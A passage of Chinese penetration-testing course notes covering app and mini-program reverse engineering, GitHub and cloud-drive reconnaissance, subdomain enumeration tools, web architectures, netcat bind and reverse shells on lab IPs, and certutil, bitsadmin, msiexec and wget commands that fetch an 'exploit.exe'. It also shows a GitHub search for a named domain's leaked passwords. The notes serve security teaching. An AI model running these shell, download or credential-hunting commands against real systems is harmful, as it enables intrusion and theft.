title="反编译提取"></a>反编译提取</h3><p>逆向工程获取APP源码后提取关键信息</p><p>动态与静态分析</p><ul><li>静态分析<ul><li>定义：通过反编译APP获取源码后提取信息</li><li>特点：可能包含未实际使用的代码和配置</li></ul></li><li>动态分析<ul><li>定义：通过运行APP抓取实际交互数据</li><li>特点：只反映实际被调用的功能</li><li>示例：用户操作触发的网络请求</li></ul></li><li>关键区别<ul><li>静态提取可能获得未使用的”死代码”</li><li>动态提取只能获取实际触发的功能</li><li>两者提取方法和技术完全不同</li></ul></li></ul><p>优缺点：</p><ul><li>优点<ul><li>理论上可以获取APP所有代码</li><li>覆盖面更完整</li></ul></li><li>缺点<ul><li>可能提取大量无用信息</li><li>需要额外筛选有效数据</li><li>技术门槛较高</li></ul></li></ul><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>平台分析：</p><ul><li><a href="https://www.zhihuaspace.cn:8888/">南明离火-移动安全分析平台</a></li></ul><p>工具：</p><p>​<a href="https://github.com/kelvinBen/AppInfoScanner">GitHub - kelvinBen&#x2F;AppInfoScanner</a></p><blockquote><ul><li>扫描Android应用的APK文件、DEX文件、需要下载的APK文件下载地址、保存需要扫描的文件的目录</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python app.py android -i &lt;Your APK File or DEX File or APK Download Url or Save File Dir&gt;</span><br></pre></td></tr></table></figure><ul><li>扫描iOS应用的IPA文件、Mach-o文件、需要下载的IPA文件下载地址、保存需要扫描的文件目录</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python app.py ios -i &lt;Your IPA file or Mach-o File or IPA Download Url or Save File Dir&gt;</span><br></pre></td></tr></table></figure><ul><li>扫描Web站点的文件、目录、需要缓存的站点URl</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python app.py web -i &lt;Your Web file or Save Web Dir or Web Cache Url&gt;</span><br></pre></td></tr></table></figure></blockquote><p>尽量搭配抓包进行补充</p><h4 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h4><p>推荐工具: MobSF（Mobile Security Framework）</p><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">GitHub - MobSF</a></p><p>环境要求</p><ul><li>需本地安装（服务器安装无法进行动态调试）</li><li>配合逍遥模拟器使用</li></ul><p>安装流程</p><ul><li>下载所需组件</li><li>运行steep.bat自动配置环境</li><li>执行run.bat启动服务（默认8000端口）</li></ul><p>核心功能</p><ul><li><p>动态分析</p><ul><li>自动检测安卓运行时环境</li><li>支持活动启动、屏幕截图等基础操作</li></ul></li><li><p>安全测试</p><ul><li>检测证书校验机制（如根CA、公钥固定等）</li><li>提供绕过方案（集成Frida框架）</li></ul></li><li><p>流量监控</p><ul><li>捕获HTTPS明文通信</li><li>记录用户操作产生的请求</li></ul></li><li><p>调试报告</p><ul><li>包含屏幕操作记录</li><li>提取的域名信息（如sso域名）</li><li>接口调用详情（如登录请求参数）</li><li>安全风险分析（如SQL注入点）</li></ul></li><li><p>优势对比</p><ul><li>相比静态分析能获取运行时数据</li><li>相比单纯抓包提供更全面的调试功能</li><li>本地部署避免在线平台的会员限制</li></ul></li></ul><h1 id="小程序应用"><a href="#小程序应用" class="headerlink" title="小程序应用"></a>小程序应用</h1><h2 id="小程序获取"><a href="#小程序获取" class="headerlink" title="小程序获取"></a>小程序获取</h2><p><strong>主要平台</strong></p><ul><li>微信</li><li>支付宝</li><li>抖音头条</li><li>百度</li></ul><p><strong>小程序结构</strong></p><p>主体文件（必须放在根目录）</p><ul><li>app.js：入口文件，类似于Java中的main方法</li><li>app.json：全局配置文件</li><li>app.wxss：全局样式文件</li></ul><p>页面组成（每个页面由4个文件组成）</p><ul><li>xxx.js：页面逻辑</li><li>xxx.json：页面配置</li><li>xxx.wxml：页面结构</li><li>xxx.wxss：页面样式</li></ul><p>目录结构</p><ul><li>pages：存放页面文件</li><li>utils：工具类文件夹</li><li>project.config.json：项目配置文件</li><li>sitemap.json：配置小程序是否允许被索引</li></ul><p><strong>搜索方法</strong></p><ul><li>直接在平台搜索框输入关键词即可查找目标小程序</li><li>可搜索的内容包括：小程序名称、网站标题、备案信息等</li><li>示例：在微信搜索”小迪”会显示相关关键词的小程序列表</li></ul><h2 id="小程序信息收集"><a href="#小程序信息收集" class="headerlink" title="小程序信息收集"></a>小程序信息收集</h2><h3 id="抓包技术"><a href="#抓包技术" class="headerlink" title="抓包技术"></a>抓包技术</h3><p>获取小程序通信的IP或域名，为后续安全测试提供目标</p><ul><li>核心工具：使用Proxifier与Burp Suite联动</li></ul><p>Proxifier需要设置规则为监听<code>WeChatApp.exe</code></p><p>收集内容</p><ul><li>域名信息（如m.yht7.com）</li><li>API接口（如&#x2F;api&#x2F;inews&#x2F;9&#x2F;8）</li><li>请求参数和响应数据</li></ul><h3 id="小程序逆向"><a href="#小程序逆向" class="headerlink" title="小程序逆向"></a>小程序逆向</h3><p>文档参考</p><p><a href="../%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4%E3%80%81APK%E5%B0%8F%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91%E7%A0%B4%E5%A3%B3.md">APP程序逆向</a></p><p>小程序多功能助手</p><p><a href="https://xcx.siqingw.top/">小程序多功能助手</a></p><p>操作流程</p><ul><li>扎到Wechat文件存储的目录</li><li>清空wxapkg缓存文件</li><li>运行目标小程序生成新包</li><li>使用工具选择_APP_.wxapkg文件</li><li>先执行解包再反编译（新版&#x2F;旧版根据小程序版本选择）</li><li>通过微信开发者工具导入反编译后的源码</li></ul><h1 id="查缺补漏"><a href="#查缺补漏" class="headerlink" title="查缺补漏"></a>查缺补漏</h1><h2 id="公众号信息收集"><a href="#公众号信息收集" class="headerlink" title="公众号信息收集"></a>公众号信息收集</h2><h3 id="获取公众号"><a href="#获取公众号" class="headerlink" title="获取公众号"></a>获取公众号</h3><p>1、爱企查查询</p><ul><li>查询方法：在爱企查平台搜索企业名称，查看”知识产权”和”网站备案”栏目</li><li>关键信息：部分企业会在知识产权中泄露微信公众号信息，如成都生动网络科技有限公司案例</li><li>注意事项：显示微信号为零不代表真实没有，可能是收益手段</li></ul><p>2、搜狗微信</p><ul><li>搜索技巧：<ul><li>直接搜索企业全称（如”成都生动网络科技有限公司”）</li><li>若无结果可尝试去掉部分关键词或使用简称</li><li>可通过”搜文章”功能查找相关交互内容</li></ul></li><li>验证方法：搜索结果需人工判断是否为目标公众号</li></ul><h2 id="GitHub信息收集"><a href="#GitHub信息收集" class="headerlink" title="GitHub信息收集"></a>GitHub信息收集</h2><h3 id="收集方式"><a href="#收集方式" class="headerlink" title="收集方式"></a>收集方式</h3><h4 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h4><p>​查询源码泄露信息或数据泄露信息</p><p>基础语法：</p><ul><li>in:name test：仓库标题搜索</li><li>in:description test：仓库描述搜索</li><li>stars:&gt;3000 test：stars数量过滤</li></ul><p>高级技巧：组合使用password in:file等语法可发现敏感信息</p><p>eg.1</p><blockquote><p>x-bull.com password in:file</p></blockquote><p>通过结果进行人工检查泄露信息与目标的关联性</p><p>其他语句</p><blockquote><ul><li>库标题搜索：使用in:name test可搜索仓库标题含关键字的项目</li><li>描述搜索：in:description test可搜索仓库描述含关键字的项目</li><li>Readme搜索：in:readme test可搜索Readme文件含关键字的项目</li><li>星标筛选：<ul><li>stars:&gt;3000 test筛选星标大于3000的项目</li><li>stars:1000..3000 test筛选星标在1000-3000之间的项目</li></ul></li><li>分支筛选：<ul><li>forks:&gt;1000 test筛选分支数大于1000的项目</li><li>forks:1000..8000 test筛选分支数在1000-8000之间的项目</li></ul></li></ul></blockquote><h4 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h4><p>收集人员和邮箱信息</p><ul><li>域名搜索：基于目标网站域名进行信息收集，如搜索”edu.cn”等教育机构域名</li><li>人员信息搜索：通过开发人员姓名、邮箱等个人信息进行检索，适用于查找个人相关的代码提交</li><li>混合搜索：可同时使用”域名+邮箱”等组合条件提高搜索精准度</li></ul><h3 id="Github监控"><a href="#Github监控" class="headerlink" title="Github监控"></a>Github监控</h3><p>通过监控github检测是否有源代码泄露</p><p>工具推荐</p><ul><li><a href="https://github.com/NHPT/FireEyeGoldCrystal">NHPT&#x2F;FireEyeGoldCrystal: 一个GitHub监控和信息收集工具，支持监控和收集CVE、免杀、漏洞利用等内置关键字和自定义关键字。</a></li><li><a href="https://github.com/VKSRC/Github-Monitor">VKSRC&#x2F;Github-Monitor: Github Sensitive Information Leakage Monitor(Github信息泄漏监控系统)</a></li><li><a href="https://github.com/madneal/gshark">madneal&#x2F;gshark: Scan for sensitive information easily and effectively.</a></li></ul><p><strong>确保与GitHub的稳定连接</strong></p><h2 id="网盘信息收集"><a href="#网盘信息收集" class="headerlink" title="网盘信息收集"></a>网盘信息收集</h2><p>主要收集</p><p>​存储企业招标人员信息、业务产品和业务员资料等各类文件（包括但不限于网站源码、公司Excel表格、企业招标信息、企业介绍文档等）</p><p>搜索方式：</p><ul><li>盘搜搜：<a href="https://pansoso.com/">网盘搜索,就上盘搜搜 - 好用的百度云搜索引擎</a></li><li>盘多多：<a href="http://www.panduoduo.net/">http://www.panduoduo.net</a></li><li>大力盘：<a href="https://dalipan.com/">https://dalipan.com</a></li></ul><p>软件推荐：</p><p><a href="https://hunhepan.com/">混合盘 - 自定义规则类APP - 可搜索全网网盘、磁力资源</a></p><p><strong>通常作为辅助手段</strong></p><h2 id="证书搜索"><a href="#证书搜索" class="headerlink" title="证书搜索"></a>证书搜索</h2><ul><li>核心原理：通过SSL&#x2F;TLS证书关联资产</li><li>操作方法：<ul><li>获取目标网站证书</li><li>提取证书域名信息</li><li>使用特定语法搜索（如cert:）</li></ul></li><li>支持平台：Fofa、Quake等网络空间搜索引擎</li></ul><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>通过枚举的方式，爆破目录信息或者子域名信息</p><ul><li>OneForAll：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li><li>ksudbomain：<a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a></li><li>subDomainsBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li><li>Sublist3r:  <a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li><li>子域名挖掘机：<a href="https://github.com/euphrat1ca/LayerDomainFinder">https://github.com/euphrat1ca/LayerDomainFinder</a></li><li>dirsearch：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></li></ul><h1 id="自动化工具推荐"><a href="#自动化工具推荐" class="headerlink" title="自动化工具推荐"></a>自动化工具推荐</h1><h2 id="F8X自动化部署工具"><a href="#F8X自动化部署工具" class="headerlink" title="F8X自动化部署工具"></a>F8X自动化部署工具</h2><p>项目地址</p><p>​<a href="https://github.com/ffffffff0x/f8x">ffffffff0x&#x2F;f8x: 红&#x2F;蓝队环境自动化部署工具 | Red&#x2F;Blue team environment automation deployment tool</a></p><p>项目概述</p><p>​f8x是一款红蓝队环境自动化部署工具，支持多种场景的渗透测试、开发和代理环境搭建。</p><p>功能特色：</p><ul><li>支持一键部署ARL、MobSF等常见安全工具环境</li><li>可自动安装CobaltStrike、Metasploit等红队工具</li><li>支持Docker环境快速部署</li></ul><p>使用方法：</p><blockquote><ul><li>wget : <code>wget -O f8x https://raw.githubusercontent.com/ffffffff0x/f8x/main/f8x</code></li><li>curl : <code>curl -o f8x https://raw.githubusercontent.com/ffffffff0x/f8x/main/f8x</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash f8x -h</span><br></pre></td></tr></table></figure><p><img src="https://github.com/ffffffff0x/f8x/raw/main/assets/img/1.png" alt="img"></p></blockquote><h2 id="AsamF综合资产测绘工具"><a href="#AsamF综合资产测绘工具" class="headerlink" title="AsamF综合资产测绘工具"></a>AsamF综合资产测绘工具</h2><p>项目地址</p><p>​<a href="https://github.com/Kento-Sec/AsamF">Kento-Sec&#x2F;AsamF: AsamF是集成Fofa、Quake、Hunter、Shodan、Zoomeye、Chinaz、0.zone及爱企查的一站式企业信息资产收集、网络资产测绘工具。</a></p><p>项目概述</p><p>​AsamF集成了Fofa、Hunter、Quake、Zoomeye、Shodan、爱企查、Chinaz、0.zone、subfinder。AsamF支持Fofa、Hunter、Quake、Zoomeye、Shodan、Chinaz、0.zone配置多个Key，在搜索前加入对应选择key的flag可以自由切换需要使用的key。可以通过info命令来查看该key的账户信息。Union命令将联合Fofa、Hunter、Quake、Zoomeye内置的语法格式进行搜索。所有的命令、子命令都支持短命令使用。</p><p>使用方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">AsamF_windows_amd64.exe -h </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在~/.config/asamf/生成的config.json文件进行配置</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">自动结果保存在~/asamf/目录下。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">常用参数：</span><br><span class="line">NAME:</span><br><span class="line">   AsamF - 一站式资产收集处理工具</span><br><span class="line"></span><br><span class="line">USAGE:</span><br><span class="line">   AsamF_windows_amd64.exe [global options] command [command options] [arguments...]</span><br><span class="line"></span><br><span class="line">VERSION:</span><br><span class="line">   0.2.5</span><br><span class="line"></span><br><span class="line">COMMANDS:</span><br><span class="line">   fofa, f     使用Fofa搜索。</span><br><span class="line">   zoomeye, z  使用Zoomeye搜索。</span><br><span class="line">   hunter, h   使用Hunter搜索。</span><br><span class="line">   quake, q    使用Quake搜索。</span><br><span class="line">   shodan, s   使用Shodan搜索。</span><br><span class="line">   cn          使用cn命令搜索公司信息。</span><br><span class="line">   0zone, 0    使用Ozone搜索.</span><br><span class="line">   myip        查看您的IP。</span><br><span class="line">   vuln, v     搜索漏洞功能。不添加-q参数将搜索最新的30个漏洞信息。</span><br><span class="line">   help, h     Shows a list of commands or help for one command</span><br><span class="line"></span><br><span class="line">GLOBAL OPTIONS:</span><br><span class="line">   --help, -h     show help</span><br><span class="line">   --version, -v  print the version</span><br></pre></td></tr></table></figure><h2 id="ENScan-Go-企业信息收集工具"><a href="#ENScan-Go-企业信息收集工具" class="headerlink" title="ENScan Go 企业信息收集工具"></a>ENScan Go 企业信息收集工具</h2><p>项目地址：<a href="https://github.com/wgpsec/ENScan_GO">wgpsec&#x2F;ENScan_GO: 一款基于各大企业信息API的工具，解决在遇到的各种针对国内企业信息收集难题。一键收集控股公司ICP备案、APP、小程序、微信公众号等信息聚合导出。支持MCP接入</a></p><p><img src="/img/xiaodi/ENScanGo.png" alt="ENScanGo"></p><p>使用方法</p><blockquote><p>1、初次使用生成配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./enscan -v</span><br></pre></td></tr></table></figure><p>2、使用参数</p><p>Usage of enscan-v1.2.1-windows-amd64.exe:<br>  -api<br>        API模式运行<br>  -branch<br>        查询分支机构（分公司）信息<br>  -branch-filter string<br>        提供一个正则表达式，名称匹配该正则的分支机构和子公司会被跳过<br>  -debug<br>        是否显示debug详细信息<br>  -deep int<br>        递归搜索n层公司 (default 1)<br>  -delay int<br>        每个请求延迟（S）-1为随机延迟1-5S<br>  -f string<br>        批量查询，文本按行分隔<br>  -field string<br>        获取字段信息 eg icp<br>  -hold<br>        是否查询控股公司<br>  -i string<br>        公司PID<br>  -invest float<br>        投资比例 eg 100<br>  -is-branch<br>        深度查询分支机构信息（数量巨大）<br>  -is-group<br>        查询关键词为集团<br>  -is-pid<br>        批量查询文件是否为公司PID<br>  -is-show<br>        是否展示信息输出 (default true)<br>  -json<br>        json导出<br>  -mcp<br>        MCP模式运行<br>  -n string<br>        关键词 eg 小米<br>  -no-merge<br>        开启后查询文件将单独导出<br>  -out-dir string<br>        结果输出的文件夹位置(默认为outs)<br>  -out-type string<br>        导出的文件后缀 默认xlsx (default “xlsx”)<br>  -out-update string<br>        导出指定范围文件，自更新<br>  -proxy string<br>        设置代理<br>  -supplier<br>        是否查询供应商信息<br>  -timeout int<br>        每个请求默认1（分钟）超时 (default 1)<br>  -type string<br>        查询渠道，可多选 (default “aqc”)<br>  -v    版本信息</p></blockquote><h2 id="ARL灯塔"><a href="#ARL灯塔" class="headerlink" title="ARL灯塔"></a>ARL灯塔</h2><p>项目地址</p><p><a href="https://github.com/Aabyss-Team/ARL">Aabyss-Team&#x2F;ARL: ARL官方仓库备份项目：ARL(Asset Reconnaissance Lighthouse)资产侦察灯塔系统旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</a></p><p>使用方法</p><blockquote><p>1、安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">国外</span></span><br><span class="line">wget https://raw.githubusercontent.com/Aabyss-Team/ARL/master/misc/setup-arl.sh</span><br><span class="line">chmod +x setup-arl.sh</span><br><span class="line">./setup-arl.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">国内</span></span><br><span class="line">wget https://raw.gitcode.com/msmoshang/ARL/blobs/24b06ec7efb32b9be380ab01ebf505e77c7811bf/setup-arl.sh</span><br><span class="line">chmod +x setup-arl.sh</span><br><span class="line">./setup-arl.sh</span><br></pre></td></tr></table></figure><p>2、访问web页面</p><p>源码安装后，请前往ARL-Web页面：<code>https://IP:5003/</code></p><p>原账号密码：<code>admin</code>,<code>arlpass</code></p><p>新版账号密码为随机生成，会打印在控制台</p></blockquote><h2 id="Nemo-信息收集平台"><a href="#Nemo-信息收集平台" class="headerlink" title="Nemo 信息收集平台"></a>Nemo 信息收集平台</h2><p>项目地址</p><p>​<a href="https://github.com/hanc00l/nemo_go?tab=readme-ov-file">hanc00l&#x2F;nemo_go: Nemo是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率。</a></p><p>安装方法</p><p>​<a href="https://github.com/hanc00l/nemo_go/blob/main/v3/docs/install.md">https://github.com/hanc00l/nemo_go/blob/main/v3/docs/install.md</a></p><p>使用方法</p><p>​<a href="https://github.com/hanc00l/nemo_go/blob/main/v3/docs/quickstart.md">https://github.com/hanc00l/nemo_go/blob/main/v3/docs/quickstart.md</a></p><h2 id="All-Defense-Tool武器库"><a href="#All-Defense-Tool武器库" class="headerlink" title="All-Defense-Tool武器库"></a>All-Defense-Tool武器库</h2><p>项目地址：</p><p><a href="https://github.com/guchangan1/All-Defense-Tool">guchangan1&#x2F;All-Defense-Tool: 本项目集成了全网优秀的攻防武器工具项目，包含自动化利用，子域名、目录扫描、端口扫描等信息收集工具，各大中间件、cms、OA漏洞利用工具，爆破工具、内网横向、免杀、社工钓鱼以及应急响应、甲方安全资料等其他安全攻防资料。</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全--基础讲解(1)</title>
      <link href="/2025/05/12/xiaodi-1/"/>
      <url>/2025/05/12/xiaodi-1/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB服务搭建方式"><a href="#WEB服务搭建方式" class="headerlink" title="WEB服务搭建方式"></a>WEB服务搭建方式</h1><h2 id="常规化搭建"><a href="#常规化搭建" class="headerlink" title="常规化搭建"></a>常规化搭建</h2><p>​原理：直接将源码、中间件、数据库搭建在同一个服务器</p><p>​影响：无，使用常规的渗透测试方法即可</p><h2 id="站库分离"><a href="#站库分离" class="headerlink" title="站库分离"></a>站库分离</h2><p>​原理：源码和数据库不在同一个服务器</p><p>​影响：数据被单独存放，能连接才可影响数据；比较安全</p><h2 id="前后端分离"><a href="#前后端分离" class="headerlink" title="前后端分离"></a>前后端分离</h2><p>​原理：前端JS框架，通过API传输数据</p><p>​影响：</p><p>​前端页面大部分不存在漏洞</p><p>​后端管理大部分不在同域名</p><p>​获得权限有可能不影响后端</p><h2 id="集成软件搭建"><a href="#集成软件搭建" class="headerlink" title="集成软件搭建"></a>集成软件搭建</h2><p>​原理：打包类的集成化环境。权限配置或受控制</p><p>​影响：</p><p>​默认情况下，使用phpstudy搭建获得的webshell的权限较大</p><p>​使用灯塔搭建的网站，具有一定的安全机制</p><h2 id="使用WAF搭建"><a href="#使用WAF搭建" class="headerlink" title="使用WAF搭建"></a>使用WAF搭建</h2><p>WAF：WEB应用防火墙</p><p><img src="/img/xiaodi/image-20250420102628560.png" alt="image-20250420102628560"></p><p>影响：</p><p>​常规的渗透方法可能被拦截，需要使用绕过WAF手法进行绕过</p><h2 id="使用CDN"><a href="#使用CDN" class="headerlink" title="使用CDN"></a>使用CDN</h2><p>原理：内容分发服务，用户访问Web网站提供多地域响应，提高访问速度</p><p>影响：隐藏真实源IP，导致对目标测试错误</p><h2 id="使用OSS存储桶"><a href="#使用OSS存储桶" class="headerlink" title="使用OSS存储桶"></a>使用OSS存储桶</h2><p>原理：提供对象存储服务</p><p>使用方式：</p><p>​1、开通OSS</p><p>​2、新建Bucket</p><p>​3、配置Bucket属性</p><p>​4、配置Access访问</p><p>影响：上传的文件或解析的文件均来自于OSS资源，无法解析，单独存储<br>    1、修复上传安全<br>    2、文件解析不一样<br>    3、但存在Accesskey隐患</p><h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>负载均衡就是一种计算机网络技术，用来在多个计算机（计算机集群）、网络连接、CPU、磁碟驱动器或其他资源中分配负载，以达到最佳化资源使用、最大化吞吐率、最小化响应时间、同时避免过载的目的。</p><p>原理：分摊到多个操作单元上进行执行，共同完成工作任务</p><p>影响：有多个服务器加载服务，测试过程中存在多个目标情况</p><p><img src="https://pic2.zhimg.com/v2-8c1cfe007a2b5b64d221a20a335a9333_1440w.jpg" alt="img"></p><p>正反向代理</p><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>正向代理是一种位于客户端和原始服务器之间的服务器，它接收客户端的请求并将其转发给原始服务器，然后将服务器的响应返回给客户端（不代理不可达）</p><p><img src="/img/xiaodi/image-20250420104147752.png" alt="image-20250420104147752"></p><p>​</p><h3 id="2反向代理"><a href="#2反向代理" class="headerlink" title="2反向代理"></a>2反向代理</h3><p>通过网络反向代理转发真实服务达到访问目的影响：访问目标只是一个代理，非真实应用服务器</p><p><img src="/img/xiaodi/image-20250420104426621.png" alt="image-20250420104426621"></p><p>原理：通过网络反向代理转发真实服务达到访问目的影响：访问目标只是一个代理，非真实应用服务器</p><p>注意：正向代理和反向代理都是解决访问不可达的问题，但由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实应用毫无关系！</p><h1 id="APP应用开发架构"><a href="#APP应用开发架构" class="headerlink" title="APP应用开发架构"></a>APP应用开发架构</h1><p>1、原生开发</p><p>安卓一般使用java语言开发，当然现在也有kotlin语言进行开发。如何开发就涉及到具体编程了，这里就不详说了。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。</p><p>2、使用H5语言开发</p><p>使用H5开发的好处有很多，可多端复用，比如浏览器端，ios端，当然H5开发的体验是没有原生好的。结合我做过的项目来说，一般是这个页面需要分享出去的话，就用H5开发。</p><p>3、使用flutter开发</p><p>flutter是近年来谷歌推出的一款UI框架，使用dart语言进行开发，支持跨平台，weight渲染直接操作硬件层，体验可媲美原生。但是flutter技术比较新，生态还不完善，开发起来效率相对偏低。</p><p>4、常规Web开发</p><p>Web App软件开发简单地说，就是开发一个网站，然后加入app的壳。Web App一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且app内的交互设计等非常有效。但开发周期长端，需要的技术人员少，成本低。</p><p>#APP-开发架构-原生态-IDEA</p><p>演示：remusic项目源码</p><p>安全影响：反编译&amp;抓包&amp;常规测试</p><p>安全影响：逆向的角度去分析逻辑设计安全</p><p>#APP-开发架构–Web封装-封装平台</p><p>演示：ShopXO源码程序+一门APP打包</p><p>安全影响：常规Web安全测试</p><p>#APP-开发架构-H5&amp;Vue-HBuilderX</p><p>演示：HBuilderX案例</p><p>安全影响：API&amp;JS框架安全问题&amp;JS前端测试</p><p>#WX小程序-开发架构-Web封装-平台</p><p>演示：ShopXO源码程序+一门APP打包</p><p>安全影响：常规Web安全测试</p><p>#WX小程序-开发架构-H5&amp;Vue-HBuilderX</p><p>演示：HBuilderX案例</p><p>安全影响：API&amp;JS框架安全问题&amp;JS前端测试</p><h1 id="反弹SHELL"><a href="#反弹SHELL" class="headerlink" title="反弹SHELL"></a>反弹SHELL</h1><p>（攻击者视角）</p><p>正向连接：客户端进行监听本地端口，攻击者主动发送请求与客户端建立连接</p><p>反向连接：攻击者进行监听本地端口，客户端主动发送请求与攻击者建立连接</p><p>命令生成：<a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p><p>新版反弹：<a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a></p><p><strong>eg.Linux控制windows</strong></p><p>①正向连接：</p><p>Linux： nc 192.168.138.130 5566</p><p>windows：nc -e cmd -lvvp 5566</p><img src="/img/xiaodi/image-20250420163653315.png" alt="image-20250420163653315" style="zoom: 50%;" /><p>②反向连接：</p><p>Linux： nc -lvvp 5566</p><p>Windows：nc -e cmd 192.168.138.141 5566</p><img src="/img/xiaodi/image-20250420164123747.png" alt="image-20250420164123747" style="zoom:50%;" /><h2 id="防火墙出入站"><a href="#防火墙出入站" class="headerlink" title="防火墙出入站"></a>防火墙出入站</h2><p>①当防火墙入站规则被进行过滤</p><p>阻止5566端口的入站规则</p><p>思路：攻击者监听本地端口，客户端主动连接攻击者</p><p>client：nc.exe -e cmd 192.168.138.141 5566</p><p>hacker：nc -lvvp 5566</p><img src="/img/xiaodi/image-20250420165620592.png" alt="image-20250420165620592" style="zoom:50%;" /><p>注意：防火墙默认对出站过滤检测并不严格，对入站规则过滤检测较为严格（默认阻止入站连接，默认允许出站连接）</p><p>②当防火墙出站规则被进行过滤</p><p>阻止5566端口的出站规则（前提条件：允许5566的入站规则）</p><p>思路：客户端监听本地端口，攻击者主动连接客户端</p><p>client：nc.exe -e cmd -lvvp 5566</p><p>hacker：nc 192.168.138.132 5566</p><p><img src="/img/xiaodi/image-20250420170553445.png" alt="image-20250420170553445"></p><h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><p>文件下载命令生成：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p><p>Linux：wget curl python ruby perl java 等</p><p>Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32 等</p><p>Windows常用：</p><p>​</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -Command &quot;Invoke-WebRequest -Uri http://127.0.0.1:8080/test.exe -OutFile exploit.exe&quot;</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f http://127.0.0.1:8080/test.exe exploit.exe</span><br><span class="line"></span><br><span class="line">bitsadmin /rawreturn /transfer down &quot;http://127.0.0.1:8080/test.exe&quot; c:\\exploit.exe</span><br><span class="line"></span><br><span class="line">msiexec /q /i http://127.0.0.1:8080/test.exe</span><br></pre></td></tr></table></figure><p>Linux常用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://127.0.0.1:8080/test.exe -O exploit.exe</span><br><span class="line"></span><br><span class="line">curl http://127.0.0.1:8080/test.exe -o exploit.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="数据不回显"><a href="#数据不回显" class="headerlink" title="数据不回显"></a>数据不回显</h1><p><img src="/img/xiaodi/image-20250420173346329.png" 